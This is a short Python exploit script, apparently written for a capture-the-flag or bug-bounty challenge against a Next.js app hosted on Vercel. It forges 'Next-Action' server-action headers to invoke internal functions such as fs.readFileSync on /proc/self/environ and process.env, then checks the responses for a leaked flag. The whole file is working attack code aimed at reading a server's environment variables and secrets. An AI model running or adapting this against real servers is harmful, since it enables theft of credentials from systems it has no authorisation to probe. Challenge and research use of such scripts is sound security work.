#!/usr/bin/env python3
"""
Try using fs module to read environment or process information
"""

import requests
import json

TARGET = "https://nextjs-cve-hackerone.vercel.app"
ACTION_ID = "007138e0bfbdd7fe024391a1251fd5861f0b5145dc"

# Try different module/function combinations
attempts = [
    {
        "name": "process.env direct access",
        "action": "process",
        "args": []
    },
    {
        "name": "fs.readFileSync /proc/self/environ",
        "action": "$$fs.readFileSync",
        "args": ["/proc/self/environ", {"encoding": "utf8"}]
    },
    {
        "name": "require process",
        "action": "$$process",
        "args": []
    },
]

for attempt in attempts:
    print(f"\n[*] Trying: {attempt['name']}")

    headers = {
        'Next-Action': attempt['action'],
        'Content-Type': 'application/json',
        'Accept': 'text/x-component',
    }

    try:
        response = requests.post(TARGET, json=attempt['args'], headers=headers, timeout=10)
        print(f"    Status: {response.status_code}")
        print(f"    Response: {response.text[:500]}")

        if "VERCEL_PLATFORM_PROTECTION" in response.text or (response.status_code == 200 and "Hello" not in response.text):
            print(f"\n[!!!] POTENTIAL FLAG [!!!]")
            print(response.text)
    except Exception as e:
        print(f"    Error: {e}")

# Try calling the legitimate action to see what it returns
print("\n[*] Calling legitimate sayHello action")
headers = {
    'Next-Action': ACTION_ID,
    'Content-Type': 'application/json',
    'Accept': 'text/x-component',
}

response = requests.post(TARGET, json=[], headers=headers, timeout=10)
print(f"Status: {response.status_code}")
print(f"Response: {response.text}")
